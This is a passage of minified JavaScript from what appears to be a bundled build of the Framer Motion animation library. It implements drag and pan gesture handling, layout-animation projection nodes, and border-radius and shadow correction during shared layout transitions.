d=ai(window,"resize",()=>this.scalePositionWithinConstraints()),h=a.addEventListener("didUpdate",(({delta:p,hasLayoutChanged:f})=>{this.isDragging&&f&&(jt(m=>{const y=this.getAxisMotionValue(m);y&&(this.originPoint[m]+=p[m].translate,y.set(y.get()+p[m].translate))}),this.visualElement.render())}));return()=>{d(),r(),c(),h&&h()}}getProps(){const t=this.visualElement.getProps(),{drag:r=!1,dragDirectionLock:s=!1,dragPropagation:a=!1,dragConstraints:c=!1,dragElastic:d=Vc,dragMomentum:h=!0}=t;return{...t,drag:r,dragDirectionLock:s,dragPropagation:a,dragConstraints:c,dragElastic:d,dragMomentum:h}}}function Ro(n,t,r){return(t===!0||t===n)&&(r===null||r===n)}function Sx(n,t=10){let r=null;return Math.abs(n.y)>t?r="y":Math.abs(n.x)>t&&(r="x"),r}class Ax extends Fi{constructor(t){super(t),this.removeGroupControls=Ue,this.removeListeners=Ue,this.controls=new Tx(t)}mount(){const{dragControls:t}=this.node.getProps();t&&(this.removeGroupControls=t.subscribe(this.controls)),this.removeListeners=this.controls.addListeners()||Ue}unmount(){this.removeGroupControls(),this.removeListeners()}}const xf=n=>(t,r)=>{n&&_e.update(()=>n(t,r))};class Cx extends Fi{constructor(){super(...arguments),this.removePointerDownListener=Ue}onPointerDown(t){this.session=new Pm(t,this.createPanHandlers(),{transformPagePoint:this.node.getTransformPagePoint(),contextWindow:Mm(this.node)})}createPanHandlers(){const{onPanSessionStart:t,onPanStart:r,onPan:s,onPanEnd:a}=this.node.getProps();return{onSessionStart:xf(t),onStart:xf(r),onMove:s,onEnd:(c,d)=>{delete this.session,a&&_e.update(()=>a(c,d))}}}mount(){this.removePointerDownListener=ci(this.node.current,"pointerdown",t=>this.onPointerDown(t))}update(){this.session&&this.session.updateHandlers(this.createPanHandlers())}unmount(){this.removePointerDownListener(),this.session&&this.session.end()}}function Px(){const n=S.useContext(ea);if(n===null)return[!0,null];const{isPresent:t,onExitComplete:r,register:s}=n,a=S.useId();return S.useEffect(()=>s(a),[]),!t&&r?[!1,()=>r&&r(a)]:[!0]}const Fo={hasAnimatedSinceResize:!0,hasEverUpdated:!1};function Tf(n,t){return t.max===t.min?0:n/(t.max-t.min)*100}const qr={correct:(n,t)=>{if(!t.target)return n;if(typeof n=="string")if(le.test(n))n=parseFloat(n);else return n;const r=Tf(n,t.target.x),s=Tf(n,t.target.y);return`${r}% ${s}%`}},Ex={correct:(n,{treeScale:t,projectionDelta:r})=>{const s=n,a=Ni.parse(n);if(a.length>5)return s;const c=Ni.createTransformer(n),d=typeof a[0]!="number"?1:0,h=r.x.scale*t.x,p=r.y.scale*t.y;a[0+d]/=h,a[1+d]/=p;const f=Be(h,p,.5);return typeof a[2+d]=="number"&&(a[2+d]/=f),typeof a[3+d]=="number"&&(a[3+d]/=f),c(a)}};class Ix extends Pe.Component{componentDidMount(){const{visualElement:t,layoutGroup:r,switchLayoutGroup:s,layoutId:a}=this.props,{projection:c}=t;Ow(_x),c&&(r.group&&r.group.add(c),s&&s.register&&a&&s.register(c),c.root.didUpdate(),c.addEventListener("animationComplete",()=>{this.safeToRemove()}),c.setOptions({...c.options,onExitComplete:()=>this.safeToRemove()})),Fo.hasEverUpdated=!0}getSnapshotBeforeUpdate(t){const{layoutDependency:r,visualElement:s,drag:a,isPresent:c}=this.props,d=s.projection;return d&&(d.isPresent=c,a||t.layoutDependency!==r||r===void 0?d.willUpdate():this.safeToRemove(),t.isPresent!==c&&(c?d.promote():d.relegate()||_e.postRender(()=>{const h=d.getStack();(!h||!h.members.length)&&this.safeToRemove()}))),null}componentDidUpdate(){const{projection:t}=this.props.visualElement;t&&(t.root.didUpdate(),queueMicrotask(()=>{!t.currentAnimation&&t.isLead()&&this.safeToRemove()}))}componentWillUnmount(){const{visualElement:t,layoutGroup:r,switchLayoutGroup:s}=this.props,{projection:a}=t;a&&(a.scheduleCheckAfterUnmount(),r&&r.group&&r.group.remove(a),s&&s.deregister&&s.deregister(a))}safeToRemove(){const{safeToRemove:t}=this.props;t&&t()}render(){return null}}function jm(n){const[t,r]=Px(),s=S.useContext(cd);return Pe.createElement(Ix,{...n,layoutGroup:s,switchLayoutGroup:S.useContext(Ig),isPresent:t,safeToRemove:r})}const _x={borderRadius:{...qr,applyTo:["borderTopLeftRadius","borderTopRightRadius","borderBottomLeftRadius","borderBottomRightRadius"]},borderTopLeftRadius:qr,borderTopRightRadius:qr,borderBottomLeftRadius:qr,borderBottomRightRadius:qr,boxShadow:Ex},Lm=["TopLeft","TopRight","BottomLeft","BottomRight"],Rx=Lm.length,Sf=n=>typeof n=="string"?parseFloat(n):n,Af=n=>typeof n=="number"||le.test(n);function Dx(n,t,r,s,a,c){a?(n.opacity=Be(0,r.opacity!==void 0?r.opacity:1,Mx(s)),n.opacityExit=Be(t.opacity!==void 0?t.opacity:1,0,jx(s))):c&&(n.opacity=Be(t.opacity!==void 0?t.opacity:1,r.opacity!==void 0?r.opacity:1,s));for(let d=0;d<Rx;d++){const h=`border${Lm[d]}Radius`;let p=Cf(t,h),f=Cf(r,h);if(p===void 0&&f===void 0)continue;p||(p=0),f||(f=0),p===0||f===0||Af(p)===Af(f)?(n[h]=Math.max(Be(Sf(p),Sf(f),s),0),(Yt.test(f)||Yt.test(p))&&(n[h]+="%")):n[h]=f}(t.rotate||r.rotate)&&(n.rotate=Be(t.rotate||0,r.rotate||0,s))}function Cf(n,t){return n[t]!==void 0?n[t]:n.borderRadius}const Mx=Om(0,.5,rm),jx=Om(.5,.95,Ue);function Om(n,t,r){return s=>s<n?0:s>t?1:r(ls(n,t,s))}function Pf(n,t){n.min=t.min,n.max=t.max}function Dt(n,t){Pf(n.x,t.x),Pf(n.y,t.y)}function Ef(n,t,r,s,a){return n-=t,n=Qo(n,1/r,s),a!==void 0&&(n=Qo(n,1/a,s)),n}function Lx(n,t=0,r=1,s=.5,a,c=n,d=n){if(Yt.test(t)&&(t=parseFloat(t),t=Be(d.min,d.max,t/100)-d.min),typeof t!="number")return;let h=Be(c.min,c.max,s);n===c&&(h-=t),n.min=Ef(n.min,t,r,h,a),n.max=Ef(n.max,t,r,h,a)}function If(n,t,[r,s,a],c,d){Lx(n,t[r],t[s],t[a],t.scale,c,d)}const Ox=["x","scaleX","originX"],Bx=["y","scaleY","originY"];function _f(n,t,r,s){If(n.x,t,Ox,r?r.x:void 0,s?s.x:void 0),If(n.y,t,Bx,r?r.y:void 0,s?s.y:void 0)}function Rf(n){return n.translate===0&&n.scale===1}function Bm(n){return Rf(n.x)&&Rf(n.y)}function Nx(n,t){return n.x.min===t.x.min&&n.x.max===t.x.max&&n.y.min===t.y.min&&n.y.max===t.y.max}function Nm(n,t){return Math.round(n.x.min)===Math.round(t.x.min)&&Math.round(n.x.max)===Math.round(t.x.max)&&Math.round(n.y.min)===Math.round(t.y.min)&&Math.round(n.y.max)===Math.round(t.y.max)}function Df(n){return St(n.x)/St(n.y)}class Fx{constructor(){this.members=[]}add(t){Sd(this.members,t),t.scheduleRender()}remove(t){if(Ad(this.members,t),t===this.prevLead&&(this.prevLead=void 0),t===this.lead){const r=this.members[this.members.length-1];r&&this.promote(r)}}relegate(t){const r=this.members.findIndex(a=>t===a);if(r===0)return!1;let s;for(let a=r;a>=0;a--){const c=this.members[a];if(c.isPresent!==!1){s=c;break}}return s?(this.promote(s),!0):!1}promote(t,r){const s=this.lead;if(t!==s&&(this.prevLead=s,this.lead=t,t.show(),s)){s.instance&&s.scheduleRender(),t.scheduleRender(),t.resumeFrom=s,r&&(t.resumeFrom.preserveOpacity=!0),s.snapshot&&(t.snapshot=s.snapshot,t.snapshot.latestValues=s.animationValues||s.latestValues),t.root&&t.root.isUpdating&&(t.isLayoutDirty=!0);const{crossfade:a}=t.options;a===!1&&s.hide()}}exitAnimationComplete(){this.members.forEach(t=>{const{options:r,resumingFrom:s}=t;r.onExitComplete&&r.onExitComplete(),s&&s.options.onExitComplete&&s.options.onExitComplete()})}scheduleRender(){this.members.forEach(t=>{t.instance&&t.scheduleRender(!1)})}removeLeadSnapshot(){this.lead&&this.lead.snapshot&&(this.lead.snapshot=void 0)}}function Mf(n,t,r){let s="";const a=n.x.translate/t.x,c=n.y.translate/t.y;if((a||c)&&(s=`translate3d(${a}px, ${c}px, 0) `),(t.x!==1||t.y!==1)&&(s+=`scale(${1/t.x}, ${1/t.y}) `),r){const{rotate:p,rotateX:f,rotateY:m}=r;p&&(s+=`rotate(${p}deg) `),f&&(s+=`rotateX(${f}deg) `),m&&(s+=`rotateY(${m}deg) `)}const d=n.x.scale*t.x,h=n.y.scale*t.y;return(d!==1||h!==1)&&(s+=`scale(${d}, ${h})`),s||"none"}const zx=(n,t)=>n.depth-t.depth;class Ux{constructor(){this.children=[],this.isDirty=!1}add(t){Sd(this.children,t),this.isDirty=!0}remove(t){Ad(this.children,t),this.isDirty=!0}forEach(t){this.isDirty&&this.children.sort(zx),this.isDirty=!1,this.children.forEach(t)}}function Vx(n,t){const r=performance.now(),s=({timestamp:a})=>{const c=a-r;c>=t&&(ui(s),n(c-t))};return _e.read(s,!0),()=>ui(s)}function Wx(n){window.MotionDebug&&window.MotionDebug.record(n)}function Hx(n){return n instanceof SVGElement&&n.tagName!=="svg"}function $x(n,t,r){const s=mt(n)?n:tr(n);return s.start(Td("",s,t,r)),s.animation}const jf=["","X","Y","Z"],Gx={visibility:"hidden"},Lf=1e3;let qx=0;const sn={type:"projectionFrame",totalNodes:0,resolvedTargetDeltas:0,recalculatedProjection:0};function Fm({attachResizeListener:n,defaultParent:t,measureScroll:r,checkIsScrollRoot:s,resetTransform:a}){return class{constructor(d={},h=t?.()){this.id=qx++,this.animationId=0,this.children=new Set,this.options={},this.isTreeAnimating=!1,this.isAnimationBlocked=!1,this.isLayoutDirty=!1,this.isProjectionDirty=!1,this.isSharedProjectionDirty=!1,this.isTransformDirty=!1,this.updateManuallyBlocked=!1,this.updateBlockedByResize=!1,this.isUpdating=!1,this.isSVG=!1,this.needsReset=!1,this.shouldResetTransform=!1,this.treeScale={x:1,y:1},this.eventHandlers=new Map,this.hasTreeAnimated=!1,this.updateScheduled=!1,this.projectionUpdateScheduled=!1,this.checkUpdateFailed=()=>{this.isUpdating&&(this.isUpdating=!1,this.clearAllSnapshots())},this.updateProjection=()=>{this.projectionUpdateScheduled=!1,sn.totalNodes=sn.resolvedTargetDeltas=sn.recalculatedProjection=0,this.nodes.forEach(Qx),this.nodes.forEach(t1),this.nodes.forEach(i1),this.nodes.forEach(Yx),Wx(sn)},this.hasProjected=!1,this.isVisible=!0,this.animationProgress=0,this.sharedNodes=new Map,this.latestValues=d,this.root=h?h.root||h:this,this.path=h?[...h.path,h]:[],this.parent=h,this.depth=h?h.depth+1:0;for(let p=0;p<this.path.length;p++)this.path[p].shouldResetTransform=!0;this.root===this&&(this.nodes=new Ux)}addEventListener(d,h){return this.eventHandlers.has(d)||this.eventHandlers.set(d,new Cd),this.eventHandlers.get(d).add(h)}notifyListeners(d,...h){const p=this.eventHandlers.get(d);p&&p.notify(...h)}hasListeners(d){return this.eventHandlers.has(d)}mount(d,h=this.root.hasTreeAnimated){if(this.instance)return;this.isSVG=Hx(d),this.instance=d;const{layoutId:p,layout:f,visualElement:m}=this.options;if(m&&!m.current&&m.mount(d),this.root.nodes.add(this),this.parent&&this.parent.children.add(this),h&&(f||p)&&(this.isLayoutDirty=!0),n){let y;const v=()=>this.root.updateBlockedByResize=!1;n(d,()=>{this.root.updateBlockedByResize=!0,y&&y(),y=Vx(v,250),Fo.hasAnimatedSinceResize&&(Fo.hasAnimatedSinceResize=!1,this.nodes.forEach(Bf))})}p&&this.root.registerSharedNode(p,this),this.options.animate!==!1&&m&&(p||f)&&this.addEventListener("didUpdate",({delta:y,hasLayoutChanged:v,hasRelativeTargetChanged:w,layout:E})=>{if(this.isTreeAnimationBlocked()){this.target=void 0,this.relativeTarget=void 0;return}const T=this.options.transition||m.getDefaultTransition()||a1,{onLayoutAnimationStart:C,onLayoutAnimationComplete:O}=m.getProps(),R=!this.targetLayout||!Nm(this.targetLayout,E)||w,M=!v&&w;if(this.options.layoutRoot||this.resumeFrom&&this.resumeFrom.instance||M||v&&(R||!this.currentAnimation)){this.resumeFrom&&(this.resumingFrom=this.resumeFrom,this.resumingFrom.resumingFrom=void 0),this.setAnimationOrigin(y,M);const L={...xd(T,"layout"),onPlay:C,onComplete:O};(m.shouldReduceMotion||this.options.layoutRoot)&&(L.delay=0,L.type=!1),this.startAnimation(L)}else v||Bf(this),this.isLead()&&this.options.onExitComplete&&this.options.onExitComplete();this.targetLayout=E})}unmount(){this.options.layoutId&&this.willUpdate(),this.root.nodes.remove(this);const d=this.getStack();d&&d.remove(this),this.parent&&this.parent.children.delete(this),this.instance=void 0,ui(this.updateProjection)}blockUpdate(){this.updateManuallyBlocked=!0}unblockUpdate(){this.updateManuallyBlocked=!1}isUpdateBlocked(){return this.updateManuallyBlocked||this.updateBlockedByResize}isTreeAnimationBlocked(){return this.isAnimationBlocked||this.parent&&this.parent.isTreeAnimationBlocked()||!1}startUpdate(){this.isUpdateBlocked()||(this.isUpdating=!0,this.nodes&&this.nodes.forEach(n1),this.animationId++)}getTransformTemplate(){const{visualElement:d}=this.options;return d&&d.getProps().transformTemplate}willUpdate(d=!0){if(this.root.hasTreeAnimated=!0,this.root.isUpdateBlocked()){this.options.onExitComplete&&this.options.onExitComplete();return}if(!this.root.isUpdating&&this.root.startUpdate(),this.isLayoutDirty)return;this.isLayoutDirty=!0;for(let m=0;m<this.path.length;m++){const y=this.path[m];y.shouldResetTransform=!0,y.updateScroll("snapshot"),y.options.layoutRoot&&y.willUpdate(!1)}const{layoutId:h,layout:p}=this.options;if(h===void 0&&!p)return;const f=this.getTransformTemplate();this.prevTransformTemplateValue=f?f(this.latestValues,""):void 0,this.updateSnapshot(),d&&this.notifyListeners("willUpdate")}update(){if(this.updateScheduled=!1,this.isUpdateBlocked()){this.unblockUpdate(),this.clearAllSnapshots(),this.nodes.forEach(Of);return}this.isUpdating||this.nodes.forEach(Zx),this.isUpdating=!1,this.nodes.forEach(e1),this.nodes.forEach(Kx),this.nodes.forEach(Jx),this.clearAllSnapshots();const h=performance.now();st.delta=Bi(0,1e3/60,h-st.timestamp),st.timestamp=h,st.isProcessing=!0,dc.update.process(st),dc.preRender.process(st),dc.render.process(st),st.isProcessing=!1}didUpdate(){this.updateScheduled||(this.updateScheduled=!0,queueMicrotask(()=>this.update()))}clearAllSnapshots(){this.nodes.forEach(Xx),this.sharedNodes.forEach(r1)}scheduleUpdateProjection(){this.projectionUpdateScheduled||(this.projectionUpdateScheduled=!0,_e.preRender(this.updateProjection,!1,!0))}scheduleCheckAfterUnmount(){_e.postRender(()=>{this.isLayoutDirty?this.root.didUpdate():this.root.checkUpdateFailed()})}updateSnapshot(){this.snapshot||!this.instance||(this.snapshot=this.measure())}updateLayout(){if(!this.instance||(this.updateScroll(),!(this.options.alwaysMeasureLayout&&this.isLead())&&!this.isLayoutDirty))return;if(this.resumeFrom&&!this.resumeFrom.instance)for(let p=0;p<this.path.length;p++)this.path[p].updateScroll();const d=this.layout;this.layout=this.measure(!1),this.layoutCorrected=He(),this.isLayoutDirty=!1,this.projectionDelta=void 0,this.notifyListeners("measure",this.layout.layoutBox);const{visualElement:h}=this.options;h&&h.notify("LayoutMeasure",this.layout.layoutBox,d?d.layoutBox:void 0)}updateScroll(d="measure"){let h=!!(this.options.layoutScroll&&this.instance);this.scroll&&this.scroll.animationId===this.root.animationId&&this.scroll.phase===d&&(h=!1),h&&(this.scroll={animationId:this.root.animationId,phase:d,isRoot:s(this.instance),offset:r(this.instance)})}resetTransform(){if(!a)return;const d=this.isLayoutDirty||this.shouldResetTransform,h=this.projectionDelta&&!Bm(this.projectionDelta),p=this.getTransformTemplate(),f=p?p(this.latestValues,""):void 0,m=f!==this.prevTransformTemplateValue;d&&(h||rn(this.latestValues)||m)&&(a(this.instance,f),this.shouldResetTransform=!1,this.scheduleRender())}measure(d=!0){const h=this.measurePageBox();let p=this.removeElementScroll(h);return d&&(p=this.removeTransform(p)),l1(p),{animationId:this.root.animationId,measuredBox:h,layoutBox:p,latestValues:{},source:this.id}}measurePageBox(){const{visualElement:d}=this.options;if(!d)return He();const h=d.measureViewportBox(),{scroll:p}=this.root;return p&&(Mi(h.x,p.offset.x),Mi(h.y,p.offset.y)),h}removeElementScroll(d){const h=He();Dt(h,d);for(let p=0;p<this.path.length;p++){const f=this.path[p],{scroll:m,options:y}=f;if(f!==this.root&&m&&y.layoutScroll){if(m.isRoot){Dt(h,d);const{scroll:v}=this.root;v&&(Mi(h.x,-v.offset.x),Mi(h.y,-v.offset.y))}Mi(h.x,m.offset.x),Mi(h.y,m.offset.y)}}return h}applyTransform(d,h=!1){const p=He();Dt(p,d);for(let f=0;f<this.path.length;f++){const m=this.path[f];!h&&m.options.layoutScroll&&m.scroll&&m!==m.root&&Zn(p,{x:-m.scroll.offset.x,y:-m.scroll.offset.y}),rn(m.latestValues)&&Zn(p,m.latestValues)}return rn(this.latestValues)&&Zn(p,this.latestValues),p}removeTransform(d){const h=He();Dt(h,d);for(let p=0;p<this.path.length;p++){const f=this.path[p];if(!f.instance||!rn(f.latestValues))continue;Wc(f.latestValues)&&f.updateSnapshot();const m=He(),y=f.measurePageBox();Dt(m,y),_f(h,f.latestValues,f.snapshot?f.snapshot.layoutBox:void 0,m)}return rn(this.latestValues)&&_f(h,this.latestValues),h}setTargetDelta(d){this.targetDelta=d,this.root.scheduleUpdateProjection(),this.isProjectionDirty=!0}setOptions(d){this.options={...this.options,...d,crossfade:d.crossfade!==void 0?d.crossfade:!0}}clearMeasurements(){this.scroll=void 0,this.layout=void 0,this.snapshot=void 0,this.prevTransformTemplateValue=void 0,this.targetDelta=void 0,this.target=void 0,this.isLayoutDirty=!1}forceRelativeParentToResolveTarget(){this.relativeParent&&this.relativeParent.resolvedRelativeTargetAt!==st.timestamp&&this.relativeParent.resolveTargetDelta(!0)}resolveTargetDelta(d=!1){var h;const p=this.getLead();this.isProjectionDirty||(this.isProjectionDirty=p.isProjectionDirty),this.isTransformDirty||(this.isTransformDirty=p.isTransformDirty),this.isSharedProjectionDirty||(this.isSharedProjectionDirty=p.isSharedProjectionDirty);const f=!!this.resumingFrom||this!==p;if(!(d||f&&this.isSharedProjectionDirty||this.isProjectionDirty||!((h=this.parent)===null||h===void 0)&&h.isProjectionDirty||this.attemptToResolveRelativeTarget))return;const{layout:y,layoutId:v}=this.options;if(!(!this.layout||!(y||v))){if(this.resolvedRelativeTargetAt=st.timestamp,!this.targetDelta&&!this.relativeTarget){const w=this.getClosestProjectingParent();w&&w.layout&&this.animationProgress!==1?(this.relativeParent=w,this.forceRelativeParentToResolveTarget(),this.relativeTarget=He(),this.relativeTargetOrigin=He(),is(this.relativeTargetOrigin,this.layout.layoutBox,w.layout.layoutBox),Dt(this.relativeTarget,this.relativeTargetOrigin)):this.relativeParent=this.relativeTarget=void 0}if(!(!this.relativeTarget&&!this.targetDelta)){if(this.target||(this.target=He(),this.targetWithTransforms=He()),this.relativeTarget&&this.relativeTargetOrigin&&this.relativeParent&&this.relativeParent.target?(this.forceRelativeParentToResolveTarget(),cx(this.target,this.relativeTarget,this.relativeParent.target)):this.targetDelta?(this.resumingFrom?this.target=this.applyTransform(this.layout.layoutBox):Dt(this.target,this.layout.layoutBox),Rm(this.target,this.targetDelta)):Dt(this.target,this.layout.layoutBox),this.attemptToResolveRelativeTarget){this.attemptToResolveRelativeTarget=!1;const w=this.getClosestProjectingParent();w&&!!w.resumingFrom==!!this.resumingFrom&&!w.options.layoutScroll&&w.target&&this.animationProgress!==1?(this.relativeParent=w,this.forceRelativeParentToResolveTarget(),this.relativeTarget=He(),this.relativeTargetOrigin=He(),is(this.relativeTargetOrigin,this.target,w.target),Dt(this.relativeTarget,this.relativeTargetOrigin)):this.relativeParent=this.relativeTarget=void 0}sn.resolvedTargetDeltas++}}}getClosestProjectingParent(){if(!(!this.parent||Wc(this.parent.latestValues)||_m(this.parent.latestValues)))return this.parent.isProjecting()?this.parent:this.parent.getClosestProjectingParent()}isProjecting(){return!!((this.relativeTarget||this.targetDelta||this.options.layoutRoot)&&this.layout)}calcProjection(){var d;const h=this.getLead(),p=!!this.resumingFrom||this!==h;let f=!0;if((this.isProjectionDirty||!((d=this.parent)===null||d===void 0)&&d.isProjectionDirty)&&(f=!1),p&&(this.isSharedProjectionDirty||this.isTransformDirty)&&(f=!1),this.resolvedRelativeTargetAt===st.timestamp&&(f=!1),f)return;const{layout:m,layoutId:y}=this.options;if(this.isTreeAnimating=!!(this.parent&&this.parent.isTreeAnimating||this.currentAnimation||this.pendingAnimation),this.isTreeAnimating||(this.targetDelta=this.relativeTarget=void 0),!this.layout||!(m||y))return;Dt(this.layoutCorrected,this.layout.layoutBox);const v=this.treeScale.x,w=this.treeScale.y;bx(this.layoutCorrected,this.treeScale,this.path,p),h.layout&&!h.target&&(this.treeScale.x!==1||this.treeScale.y!==1)&&(h.target=h.layout.layoutBox);const{target:E}=h;if(!E){this.projectionTransform&&(this.projectionDelta=Xn(),this.projectionTransform="none",this.scheduleRender());return}this.projectionDelta||(this.projectionDelta=Xn(),this.projectionDeltaWithTransform=Xn());const T=this.projectionTransform;ts(this.projectionDelta,this.layoutCorrected,E,this.latestValues),this.projectionTransform=Mf(this.projectionDelta,this.treeScale),(this.projectionTransform!==T||this.treeScale.x!==v||this.treeScale.y!==w)&&(this.hasProjected=!0,this.scheduleRender(),this.notifyListeners("projectionUpdate",E)),sn.recalculatedProjection++}hide(){this.isVisible=!1}show(){this.isVisible=!0}scheduleRender(d=!0){if(this.options.scheduleRender&&this.options.scheduleRender(),d){const h=this.getStack();h&&h.scheduleRender()}this.resumingFrom&&!this.resumingFrom.instance&&(this.resumingFrom=void 0)}setAnimationOrigin(d,h=!1){const p=this.snapshot,f=p?p.latestValues:{},m={...this.latestValues},y=Xn();(!this.relativeParent||!this.relativeParent.options.layoutRoot)&&(this.relativeTarget=this.relativeTargetOrigin=void 0),this.attemptToResolveRelativeTarget=!h;const v=He(),w=p?p.source:void 0,E=this.layout?this.layout.source:void 0,T=w!==E,C=this.getStack(),O=!C||C.members.length<=1,R=!!(T&&!O&&this.options.crossfade===!0&&!this.path.some(o1));this.animationProgress=0;let M;this.mixTargetDelta=L=>{const W=L/1e3;Nf(y.x,d.x,W),Nf(y.y,d.y,W),this.setTargetDelta(y),this.relativeTarget&&this.relativeTargetOrigin&&this.layout&&this.relativeParent&&this.relativeParent.layout&&(is(v,this.layout.layoutBox,this.relativeParent.layout.layoutBox),s1(this.relativeTarget,this.relativeTargetOrigin,v,W),M&&Nx(this.relativeTarget,M)&&(this.isProjectionDirty=!1),M||(M=He()),Dt(M,this.relativeTarget)),T&&(this.animationValues=m,Dx(m,f,this.latestValues,W,R,O)),this.root.scheduleUpdateProjection(),this.scheduleRender(),this.animationProgress=W},this.mixTargetDelta(this.options.layoutRoot?1e3:0)}startAnimation(d){this.notifyListeners("animationStart"),this.currentAnimation&&this.currentAnimation.stop(),this.resumingFrom&&this.resumingFrom.currentAnimation&&this.resumingFrom.currentAnimation.stop(),this.pendingAnimation&&(ui(this.pendingAnimation),this.pendingAnimation=void 0),this.pendingAnimation=_e.update(()=>{Fo.hasAnimatedSinceResize=!0,this.currentAnimation=$x(0,Lf,{...d,onUpdate:h=>{this.mixTargetDelta(h),d.onUpdate&&d.onUpdate(h)},onComplete:()=>{d.onComplete&&d.onComplete(),this.completeAnimation()}}),this.resumingFrom&&(this.resumingFrom.currentAnimation=this.currentAnimation),this.pendingAnimation=void 0})}completeAnimation(){this.resumingFrom&&(this.resumingFrom.currentAnimation=void 0,this.resumingFrom.preserveOpacity=void 0);const d=this.getStack();d&&d.exitAnimationComplete(),this.resumingFrom=this.currentAnimation=this.animationValues=void 0,this.notifyListeners("animationComplete")}finishAnimation(){this.currentAnimation&&(this.mixTargetDelta&&this.mixTargetDelta(Lf),this.currentAnimation.stop()),this.completeAnimation()}applyTransformsToTarget(){const d=this.getLead();let{targetWithTransforms:h,target:p,layout:f,latestValues:m}=d;if(!(!h||!p||!f)){if(this!==d&&this.layout&&f&&zm(this.options.animationType,this.layout.layoutBox,f.layoutBox)){p=this.target||He();const y=St(this.layout.layoutBox.x);p.x.min=d.target.x.min,p.x.max=p.x.min+y;const v=St(this.layout.layoutBox.y);p.y.min=d.target.y.min,p.y.max=p.y.min+v}Dt(h,p),Zn(h,m),ts(this.projectionDeltaWithTransform,this.layoutCorrected,h,m)}}registerSharedNode(d,h){this.sharedNodes.has(d)||this.sharedNodes.set(d,new Fx),this.sharedNodes.get(d).add(h);const f=h.options.initialPromotionConfig;h.promote({transition:f?f.transition:void 0,preserveFollowOpacity:f&&f.shouldPreserveFollowOpacity?f.shouldPreserveFollowOpacity(h):void 0})}isLead(){const d=this.getStack();return d?d.lead===this:!0}getLead(){var d;const{layoutId:h}=this.options;return h?((d=this.getStack())===null||d===void 0?void 0:d.lead)||this:this}getPrevLead(){var d;const{layoutId:h}=this.options;return h?(d=this.getStack())===null||d===void 0?void 0:d.prevLead:void 0}getStack(){const{layoutId:d}=this.options;if(d)return this.root.sharedNodes.get(d)}promote({needsReset:d,transition:h,preserveFollowOpacity:p}={}){const f=this.getStack();f&&f.promote(this,p),d&&(this.projectionDelta=void 0,this.needsReset=!0),h&&this.setOptions({transition:h})}relegate(){const d=this.getStack();return d?d.relegate(this):!1}resetRotation(){const{visualElement:d}=this.options;if(!d)return;let h=!1;const{latestValues:p}=d;if((p.rotate||p.rotateX||p.rotateY||p.rotateZ)&&(h=!0),!h)return;const f={};for(let m=0;m<jf.length;m++){const y="rotate"+jf[m];p[y]&&(f[y]=p[y],d.setStaticValue(y,0))}d.render();for(const m in f)d.setStaticValue(m,f[m]);d.scheduleRender()}getProjectionStyles(d){var h,p;if(!this.instance||this.isSVG)return;if(!this.isVisible)return Gx;const f={visibility:""},m=this.getTransformTemplate();if(this.needsReset)return this.needsReset=!1,f.opacity="",f.pointerEvents=No(d?.pointerEvents)||"",f.transform=m?m(this.latestValues,""):"none",f;const y=this.getLead();if(!this.projectionDelta||!this.layout||!y.target){const T={};return this.options.layoutId&&(T.opacity=this.latestValues.opacity!==void 0?this.latestValues.opacity:1,T.pointerEvents=No(d?.pointerEvents)||""),this.hasProjected&&!rn(this.latestValues)&&(T.transform=m?m({},""):"none",this.hasProjected=!1),T}const v=y.animationValues||y.latestValues;this.applyTransformsToTarget(),f.transform=Mf(this.projectionDeltaWithTransform,this.treeScale,v),m&&(f.transform=m(v,f.transform));const{x:w,y:E}=this.projectionDelta;f.transformOrigin=`${w.origin*100}% ${E.origin*100}% 0`,y.animationValues?f.opacity=y===this?(p=(h=v.opacity)!==null&&h!==void 0?h:this.latestValues.opacity)!==null&&p!==void 0?p:1:this.preserveOpacity?this.latestValues.opacity:v.opacityExit:f.opacity=y===this?v.opacity!==void 0?v.opacity:"":v.opacityExit!==void 0?v.opacityExit:0;for(const T in Wo){if(v[T]===void 0)continue;const{correct:C,applyTo:O}=Wo[T],R=f.transform==="none"?v[T]:C(v[T],y);if(O){const M=O.length;for(let L=0;L<M;L++)f[O[L]]=R}else f[T]=R}return this.options.layoutId&&(f.pointerEvents=y===this?No(d?.pointerEvents)||"":"none"),f}clearSnapshot(){this.resumeFrom=this.snapshot=void 0}resetTree(){this.root.nodes.forEach(d=>{var h;return(h=d.currentAnimation)===null||h===void 0?void 0:h.stop()}),this.root.nodes.forEach(Of),this.root.sharedNodes.clear()}}}function Kx(n){n.updateLayout()}function Jx(n){var t;const r=((t=n.resumeFrom)===null||t===void 0?void 0:t.snapshot)||n.snapshot;if(n.isLead()&&n.layout&&r&&n.hasListeners("didUpdate")){const{layoutBox:s,measuredBox:a}=n.layout,{animationType:c}=n.options,d=r.source!==n.layout.source;c==="size"?jt(y=>{const v=d?r.measuredBox[y]:r.layoutBox[y],w=St(v);v.min=s[y].min,v.max=v.min+w}):zm(c,r.layoutBox,s)&&jt(y=>{const v=d?r.measuredBox[y]:r.layoutBox[y],w=St(s[y]);v.max=v.min+w,n.relativeTarget&&!n.currentAnimation&&(n.isProjectionDirty=!0,n.relativeTarget[y].max=n.relativeTarget[y].min+w)});const h=Xn();ts(h,s,r.layoutBox);const p=Xn();d?ts(p,n.applyTransform(a,!0),r.measuredBox):ts(p,s,r.layoutBox);const f=!Bm(h);let m=!1;if(!n.resumeFrom){const y=n.getClosestProjectingParent();if(y&&!y.resumeFrom){const{snapshot:v,layout:w}=y;if(v&&w){const E=He();is(E,r.layoutBox,v.layoutBox);const T=He();is(T,s,w.layoutBox),Nm(E,T)||(m=!0),y.options.layoutRoot&&(n.relativeTarget=T,n.relativeTargetOrigin=E,n.relativeParent=y)}}}n.notifyListeners("didUpdate",{layout:s,snapshot:r,delta:p,layoutDelta:h,hasLayoutChanged:f,hasRelativeTargetChanged:m})}else if(n.isLead()){const{onExitComplete:s}=n.options;s&&s()}n.options.transition=void 0}function Qx(n){sn.totalNodes++,n.parent&&(n.isProjecting()||(n.isProjectionDirty=n.parent.isProjectionDirty),n.isSharedProjectionDirty||(n.isSharedProjectionDirty=!!(n.isProjectionDirty||n.parent.isProjectionDirty||n.parent.isSharedProjectionDirty)),n.isTransformDirty||(n.isTransformDirty=n.parent.isTransformDirty))}function Yx(n){n.isProjectionDirty=n.isSharedProjectionDirty=n.isTransformDirty=!1}function Xx(n){n.clearSnapshot()}function Of(n){n.clearMeasurements()}function Zx(n){n.isLayoutDirty=!1}function e1(n){const{visualElement:t}=n.options;t&&t.getProps().onBeforeLayoutMeasure&&t.notify("BeforeLayoutMeasure"),n.resetTransform()}function 